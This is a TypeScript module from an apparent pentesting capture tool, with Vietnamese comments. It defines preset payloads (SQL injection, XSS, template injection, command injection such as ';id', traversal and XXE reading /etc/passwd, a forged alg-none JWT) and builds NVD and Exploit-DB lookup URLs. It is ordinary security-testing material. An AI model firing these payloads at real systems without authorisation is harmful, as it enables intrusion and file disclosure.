// Bộ payload pentest chèn vào Repeater + tra cứu CVE (NVD API khi user bấm).
// `name`/`description` của preset là KHOÁ i18n `capture.sec.payload.<id>` /
// `capture.sec.payload.<id>.d` (UI sở hữu capture.json); `snippet` là chuỗi payload
// thô — với kind 'note' đó là mẩu minh hoạ, UI không tự chèn. File thuần — chỉ build URL,
// KHÔNG fetch: lớp UI gọi `nvdApiUrl` rồi truyền JSON vào `parseNvdJson`.

import type { OwaspId } from './capture-owasp'

export type PayloadPreset = {
  id: string
  owasp: OwaspId | 'other'
  kind: 'query' | 'header' | 'body' | 'note'
  snippet: string
}

export const PAYLOAD_PRESETS: readonly PayloadPreset[] = [
  // ---- A03 Injection ----
  { id: 'sqli-error', owasp: 'A03', kind: 'query', snippet: "' OR '1'='1" },
  {
    id: 'sqli-error-extract',
    owasp: 'A03',
    kind: 'query',
    snippet: "' AND extractvalue(1,concat(0x7e,version()))-- -",
  },
  { id: 'sqli-time', owasp: 'A03', kind: 'query', snippet: "' OR SLEEP(3)-- -" },
  { id: 'xss-svg', owasp: 'A03', kind: 'query', snippet: '"><svg/onload=alert(1)>' },
  { id: 'xss-img', owasp: 'A03', kind: 'query', snippet: `'"><img src=x onerror=alert(1)>` },
  { id: 'ssti-basic', owasp: 'A03', kind: 'query', snippet: '{{7*7}}' },
  { id: 'ssti-el', owasp: 'A03', kind: 'query', snippet: '${7*7}' },
  { id: 'cmd-semi', owasp: 'A03', kind: 'query', snippet: ';id' },
  { id: 'cmd-pipe', owasp: 'A03', kind: 'query', snippet: '|whoami' },
  { id: 'cmd-sleep', owasp: 'A03', kind: 'query', snippet: '$(sleep 3)' },
  { id: 'crlf', owasp: 'A03', kind: 'query', snippet: '%0d%0aX-Injected:1' },
  // ---- A01 Broken Access Control ----
  { id: 'traversal', owasp: 'A01', kind: 'query', snippet: '../../../../etc/passwd' },
  { id: 'traversal-escape', owasp: 'A01', kind: 'query', snippet: '....//....//etc/passwd' },
  { id: 'open-redirect', owasp: 'A01', kind: 'query', snippet: '//evil.example' },
  { id: 'idor', owasp: 'A01', kind: 'note', snippet: '1' },
  // ---- A05 Security Misconfiguration ----
  {
    id: 'xxe',
    owasp: 'A05',
    kind: 'body',
    snippet:
      '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
  },
  { id: 'origin-reflect', owasp: 'A05', kind: 'header', snippet: 'Origin: https://evil.example' },
  // ---- A07 Auth Failures ----
  { id: 'xff-bypass', owasp: 'A07', kind: 'header', snippet: 'X-Forwarded-For: 127.0.0.1' },
  {
    id: 'jwt-alg-none',
    owasp: 'A07',
    kind: 'note',
    snippet: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwiYWRtaW4iOnRydWV9.',
  },
  { id: 'jwt-kid', owasp: 'A07', kind: 'note', snippet: '../../dev/null' },
]

// ---- Tra cứu ngoài (chỉ build URL — UI quyết định mở/fetch khi user bấm) ----

/** Trang kết quả tìm CVE trên NVD (mở trong trình duyệt). */
export function nvdSearchUrl(q: string): string {
  return `https://nvd.nist.gov/vuln/search/results?query=${encodeURIComponent(q)}`
}

/** Trang tìm exploit trên Exploit-DB. */
export function exploitDbUrl(q: string): string {
  return `https://www.exploit-db.com/search?text=${encodeURIComponent(q)}`
}

/** Trang GitHub Security Advisories. */
export function ghsaUrl(q: string): string {
  return `https://github.com/advisories?query=${encodeURIComponent(q)}`
}

/** NVD API cves/2.0 — tìm theo keyword (không cần API key, rate limit thấp). */
export function nvdApiUrl(keyword: string, limit = 20): string {
  const n = Math.min(Math.max(Math.floor(limit) || 20, 1), 100)
  return `https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${encodeURIComponent(keyword)}&resultsPerPage=${n}`
}

// ---- NVD cves/2.0 parse (phòng thủ — shape lạ trả []) ----

export type NvdCve = { id: string; score: number | null; severity: string | null; summary: string }

function obj(v: unknown): Record<string, unknown> | null {
  return typeof v === 'object' && v !== null ? (v as Record<string, unknown>) : null
}

function num(v: unknown): number | null {
  return typeof v === 'number' && Number.isFinite(v) ? v : null
}

function str(v: unknown): string | null {
  return typeof v === 'string' && v !== '' ? v : null
}

/** Lấy điểm CVSS: ưu tiên v4.0 → v3.1 → v3.0 → v2. `severity` v2 nằm trên metric, không trong cvssData. */
function cvss(metrics: unknown): { score: number | null; severity: string | null } {
  const m = obj(metrics)
  if (!m) return { score: null, severity: null }
  for (const key of ['cvssMetricV40', 'cvssMetricV31', 'cvssMetricV30'] as const) {
    const arr = m[key]
    const data = obj(Array.isArray(arr) ? obj(arr[0])?.cvssData : undefined)
    const score = num(data?.baseScore)
    if (score !== null) return { score, severity: str(data?.baseSeverity) }
  }
  const arr = m.cvssMetricV2
  const metric = obj(Array.isArray(arr) ? arr[0] : undefined)
  const score = num(obj(metric?.cvssData)?.baseScore)
  if (score !== null) return { score, severity: str(metric?.baseSeverity) }
  return { score: null, severity: null }
}

/** Parse JSON của `nvdApiUrl` (cves/2.0). Mọi shape bất thường → [] hoặc bỏ qua phần tử lỗi. */
export function parseNvdJson(json: unknown): NvdCve[] {
  const root = obj(json)
  const vulns = root?.vulnerabilities
  if (!Array.isArray(vulns)) return []
  const out: NvdCve[] = []
  for (const v of vulns) {
    const cve = obj(obj(v)?.cve)
    const id = str(cve?.id)
    if (!cve || !id) continue
    let summary = ''
    const descs = cve.descriptions
    if (Array.isArray(descs)) {
      const en = descs.find((d) => obj(d)?.lang === 'en') ?? descs[0]
      summary = str(obj(en)?.value) ?? ''
    }
    const { score, severity } = cvss(cve.metrics)
    out.push({ id, score, severity, summary })
  }
  return out
}
